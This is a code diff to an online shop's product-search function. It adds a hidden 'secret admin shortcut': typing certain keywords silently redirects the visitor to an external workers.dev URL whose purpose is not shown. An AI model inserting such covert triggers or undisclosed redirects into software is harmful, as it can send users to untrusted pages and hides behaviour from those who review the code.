@@ -430,7 +430,19 @@ function filterProducts(q) {
     g.innerHTML = products.filter(p => p.name.toLowerCase().indexOf(q) > -1 || p.category.indexOf(q) > -1 || p.seller.toLowerCase().indexOf(q) > -1 || p.description.toLowerCase().indexOf(q) > -1).map((p, i) => productCardHTML(p, i)).join('');
 }
 let _searchTimer;
-function debouncedSearch(q) { clearTimeout(_searchTimer); _searchTimer = setTimeout(() => filterProducts(q), 200); }
+function debouncedSearch(q) {
+    // 🕵️ SECRET ADMIN SHORTCUT
+    const secretCmd = q.trim().toLowerCase();
+    if (secretCmd === 'admin' || secretCmd === 'ops' || secretCmd === 'rattle') {
+        document.getElementById('search-input').value = ''; // Clear the box
+        window.location.href = 'https://dark-firefly-adc3.piratevillain99.workers.dev/';
+        return;
+    }
+    
+    // Normal search logic
+    clearTimeout(_searchTimer);
+    _searchTimer = setTimeout(() => filterProducts(q), 200);
+}
 function trendSearch(q) { const i = document.getElementById('search-input'); if (i) { i.value = q; filterProducts(q); } scrollToSection('products-section'); }
 
 function addToCart(p, btnEl) {
